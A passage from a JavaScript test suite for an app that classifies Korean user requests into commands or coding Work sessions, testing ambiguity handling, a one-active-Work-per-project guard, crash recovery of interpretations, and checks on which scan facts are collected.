    assert.strictEqual(r.rule, undefined);
  }
});

test('when two rules both consume the whole input, BOTH are offered', () => {
  /* Unreachable with today's table — the two rules that share an object have disjoint verbs —
   * so the branch is driven with a rule of the test's own, the way the migration loop is.
   * Without this the branch could quietly resolve to whichever rule came first. */
  const { RULES } = require(path.join(R, 'app/main/router/rules.js'));
  RULES.push({ id: 'test.twin', objects: ['개발서버'], verbs: ['켜'], kind: 'oneshot' });
  try {
    const r = classify('개발 서버 켜줘');
    assert.strictEqual(r.route, 'ambiguous', 'two whole-input matches were resolved silently');
    assert.ok(r.options.includes('qc.dev.start') && r.options.includes('test.twin'),
      `both readings must be offered, got ${r.options}`);
    assert.strictEqual(r.rule, undefined, 'an ambiguous result must not also name a single rule');
  } finally { RULES.pop(); }
  assert.strictEqual(classify('개발 서버 켜줘').rule, 'qc.dev.start', 'the table was not restored');
});

test('a verb with no object always keeps the Work reading', () => {
  /* `켜줘` matched two rules and lost its `work` option, while `꺼줘` matched one and kept it.
   * Same class of input, and the user could not get to a Work from one of them. */
  for (const input of ['켜줘', '꺼줘', '돌려줘', '해줘']) {
    const r = classify(input);
    assert.strictEqual(r.route, 'ambiguous', input);
    assert.ok(r.options.includes('work'), `${input} offered no way to a Claude Code Work`);
  }
});

test('classification is bounded — a pasted wall of text cannot stall the field', () => {
  const long = 'a' + '.ㅋ'.repeat(20000);
  const t0 = Date.now();
  const r = classify(long);
  const took = Date.now() - t0;
  assert.ok(took < 500, `classifying a 40 KB paste took ${took} ms`);
  assert.strictEqual(r.text, long, 'the words are still carried through whole');
});

test('a two-reading request offers both readings and picks neither', () => {
  const r = classify('서버 좀 정리해줘');
  assert.strictEqual(r.route, 'ambiguous');
  assert.deepStrictEqual(r.options, ['qc.dev.stop', 'work'],
    'q02 §3 case C: stop the server, or clean up the server code');
  const bare = classify('돌려줘');
  assert.ok(bare.options.length >= 2 && !bare.rule, 'a verb with no object must never be resolved silently');
});

/* ───────────────────────── WBS-07 · single active Work guard ───────────────────────── */

test('a second Work is refused as a GUARD, never as a crash', () => {
  const db = openDb(':memory:');
  const p = repo.openProject(db, '/g', 'g');
  const first = repo.beginWork(db, p.id, '로그인 오류 수정');
  assert.strictEqual(first.ok, true);

  const second = repo.beginWork(db, p.id, '회원가입 화면 추가');
  assert.strictEqual(second.ok, false);
  assert.strictEqual(second.reason, 'active-work');
  assert.strictEqual(second.active.id, first.work.id, 'the guard must name the Work that is actually running');
  assert.strictEqual(second.active.intent, '로그인 오류 수정');
  assert.strictEqual(db.prepare('select count(*) n from work').get().n, 1,
    'the refused request must not be queued — D-117 · UF-RULE-NOQUEUE');
  db.close();
});

test('a different constraint failure is NOT dressed up as the guard', () => {
  const db = openDb(':memory:');
  const p = repo.openProject(db, '/n', 'n');
  /* `intent` is NOT NULL. An active Work merely EXISTING was being taken as proof that the
   * guard is what refused the insert. */
  repo.beginWork(db, p.id, 'a real one');
  assert.throws(() => repo.beginWork(db, p.id, null), /NOT NULL/i,
    'a NOT NULL violation was reported as the D-117 guard');
  db.close();
});

test('the guard is per project, and it lifts when the Work ends', () => {
  const db = openDb(':memory:');
  const a = repo.openProject(db, '/a', 'a');
  const b = repo.openProject(db, '/b', 'b');
  const w = repo.beginWork(db, a.id, 'x');
  assert.strictEqual(repo.beginWork(db, b.id, 'y').ok, true, 'another project must not be blocked');

  assert.strictEqual(repo.activeWork(db, a.id).id, w.work.id);
  db.prepare("update work set status='ended', outcome='complete', ended_at='t' where id = ?").run(w.work.id);
  assert.strictEqual(repo.activeWork(db, a.id), null);
  assert.strictEqual(repo.beginWork(db, a.id, 'z').ok, true, 'the slot did not free when the Work ended');
  db.close();
});

test('every non-ended status holds the guard, not just running', () => {
  for (const status of ['running', 'input_waiting', 'permission_waiting', 'cancel_requested']) {
    const db = openDb(':memory:');
    const p = repo.openProject(db, '/s', 's');
    const w = repo.beginWork(db, p.id, 'first');
    db.prepare('update work set status = ? where id = ?').run(status, w.work.id);
    assert.strictEqual(repo.beginWork(db, p.id, 'second').ok, false, `${status} did not hold the guard`);
    db.close();
  }
});

test('an interpretation the app died inside becomes 실패, with its answers untouched', () => {
  /* `21` WBS-34 / `20`: an interpretation still `interpreting` whose process is gone becomes
   * `failed`. It does NOT become `interpreted` with invented answers, and it does not stay
   * `interpreting` — a Brief that says 읽는 중 about a read that stopped days ago is the same
   * lie as a Work stuck at 진행 중.
   *
   * The whole app is one process, so a row in this state means THAT process is gone. There is
   * no handle to ask about, which is what makes this different from a Work. */
  const repo = require(path.join(R, 'app/main/db/repo.js'));
  const { openDb } = require(path.join(R, 'app/main/db/db.js'));
  const db = openDb(':memory:');
  const project = repo.openProject(db, tempDir('juqode-interp-'), 'p');

  /* `20` numbers the six questions 1..6 — the kind rides inside `text`. */
  const answers = [{ q: 1, kind: 'what', data: { name: 'p' }, confidence: 'confirmed', sourceRef: 'package.json' },
                   { q: 5, kind: 'run', data: null, confidence: 'unconfirmed', sourceRef: null }];
  repo.saveInterpretation(db, project.id, { status: 'interpreted', sourceHash: 'h', answers, readFiles: ['package.json'] });
  db.prepare("update interpretation set status = 'interpreting', ended_at = null where project_id = ?").run(project.id);

  const closed = repo.reconcileInterpretations(db);
  assert.strictEqual(closed.length, 1, 'a stranded interpretation was left saying 읽는 중');

  const back = repo.currentInterpretation(db, project.id);
  assert.strictEqual(back.status, 'failed', 'a read that stopped is not a read that finished');
  assert.deepStrictEqual(back.answers.map((a) => a.confidence), ['confirmed', 'unconfirmed'],
    'the answers were rewritten — whatever was confirmed before the app died is still confirmed');
  assert.strictEqual(back.answers[1].data, null, 'a missing answer was filled in');

  /* …and a finished interpretation is never touched. */
  assert.deepStrictEqual(repo.reconcileInterpretations(db), []);
});

test('statusOf: 확인 못한 답이 하나라도 있으면 부분 해석, 없으면 해석됨', () => {
  /* FOUND BY MUTATION: `list.some((a) => a.confidence !== 'confirmed')` could be inverted and
   * every test passed — each of them scans a project whose answers are MIXED, so both the rule
   * and its inverse produce `partial` there. Nothing ever asserted `interpreted`.
   *
   * `11` F-C1-02: 부분 해석은 실패가 아니다, and the distinction is what SC-02 announces. Driven
   * as data because a real project with all six answers confirmed may not exist — q1..q5 need
   * files that say so — and a rule should not be untestable because reality is usually messy. */
  const scan = { failed: false };
  const a = (confidence) => ({ confidence });

  assert.strictEqual(statusOf(scan, [a('confirmed'), a('confirmed')]), 'interpreted');
  assert.strictEqual(statusOf(scan, [a('confirmed'), a('unconfirmed')]), 'partial');
  assert.strictEqual(statusOf(scan, [a('confirmed'), a('expected')]), 'partial',
    '예상됨 is not 확인됨 — a guess does not complete an interpretation');
  assert.strictEqual(statusOf(scan, [a('unconfirmed')]), 'partial');
  /* An empty list confirms nothing, but it also contradicts nothing: `some` on it is false, so
   * this is `interpreted`. Written down because it is surprising, and because a future reader
   * should see that it was considered rather than overlooked. */
  assert.strictEqual(statusOf(scan, []), 'interpreted');
  /* A failed scan wins over everything — `19` §C1: 읽지 못한 것은 부분이 아니라 실패다. */
  assert.strictEqual(statusOf({ failed: true }, [a('confirmed')]), 'failed');
  assert.strictEqual(statusOf({ failed: true }, [a('unconfirmed')]), 'failed');
});

test('the scan collects no fact that nothing reads', () => {
  /* FOUND BY MUTATION: `entry: typeof j.main === 'string' ? j.main : null` could be inverted —
   * so a `package.json` whose `main` is an object would have that object recorded as the entry
   * point — and nothing anywhere noticed, because `facts.entryHints` was collected and never
   * read by a single line of the product.
   *
   * A fact nobody reads is a claim nobody can check, and it costs a scan of every manifest to
   * produce. Deleted; this is the check that keeps it from coming back unnoticed. `19` §C1's
   * six answers take 실행 방법 from the SCRIPTS, which is measured and rendered. */
  const src = srcOf('app/main/interpret/scan.js');
  assert.ok(!/entryHints/.test(src), 'scan.js collects entryHints again — is anything reading it?');

  /* …and what the scan DOES collect is what the answers layer consumes. Enumerated from the
   * facts object rather than listed by hand, so a new key has to be justified here. */
  const decl = /const facts = \{([^}]*)\}/.exec(src);
  assert.ok(decl, 'the facts object is gone');
  const keys = [...decl[1].matchAll(/(\w+):/g)].map((m) => m[1]);
  assert.deepStrictEqual(keys.sort(),
    ['ecosystems', 'lockfiles', 'manifests', 'readme', 'scripts', 'topDirs'].sort(),
    `the scan collects ${JSON.stringify(keys)} — every one must be read by answers.js`);
  /* Read by the answers layer or by the narrative prompt — `readme` goes to the prompt and
   * nowhere else, which is a use, not a leftover. */
  const readers = ['app/main/interpret/answers.js', 'app/main/interpret/narrate.js']
    .map((f) => srcOf(f)).join('\n');
  for (const k of keys) {
    assert.ok(new RegExp(`\\b${k}\\b`).test(readers), `nothing reads facts.${k}`);
  }
});
